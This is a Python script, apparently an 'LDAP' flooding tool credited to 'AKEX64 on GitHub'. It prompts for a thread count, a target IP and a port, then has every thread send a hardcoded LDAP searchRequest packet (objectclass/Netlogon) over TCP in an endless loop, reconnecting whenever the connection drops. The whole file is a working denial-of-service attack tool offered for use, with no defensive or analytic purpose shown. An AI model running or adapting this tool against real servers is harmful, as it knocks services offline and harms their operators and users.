import requests,socket,sys,threading,time
from colorama import *

init()

banner = Fore.RED+'''


S.       .S_sSSs     .S_SSSs     .S_sSSs    
SS.     .SS~YS%%b   .SS~SSSSS   .SS~YS%%b   
S%S     S%S   `S%b  S%S   SSSS  S%S   `S%b  
S%S     S%S    S%S  S%S    S%S  S%S    S%S  
S&S     S%S    S&S  S%S SSSS%S  S%S    d*S  
S&S     S&S    S&S  S&S  SSS%S  S&S   .S*S  
S&S     S&S    S&S  S&S    S&S  S&S_sdSSS   
S&S     S&S    S&S  S&S    S&S  S&S~YSSY    
S*b     S*S    d*S  S*S    S&S  S*S         
S*S.    S*S   .S*S  S*S    S*S  S*S         
 SSSbs  S*S_sdSSS   S*S    S*S  S*S         
  YSSP  SSS~YSSY    SSS    S*S  S*S         
                           SP   SP          
                           Y    Y           
                                            
     (+) BY AKEX64 ON GITHUB (+)

'''


query =  "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a"
query += "\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01"
query += "\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
query += "\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00"
query += "\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e"
query += "\x65\x74\x6c\x6f\x67\x6f\x6e"

def Thread(ip,port):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,port))
	while True:
			
		try:
			s.sendall(bytes(query.encode()))
			print('Sent packet!')
			time.sleep(0.400)
		except:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((ip,port))
			print('Broken Pipe!')
	

print(banner)
threadsi = int(input('(*) THREADS => '))
ip = str(input('(*) IP => '))
port = int(input('(*) PORT => '))

threads = []

for i in range(threadsi):
	thread = threading.Thread(target=Thread,args=(ip,port),daemon=True)
	threads.append(thread)
	thread.start()
	print(f'Created thread {str(i)}#')
for thread in threads:
	thread.join()
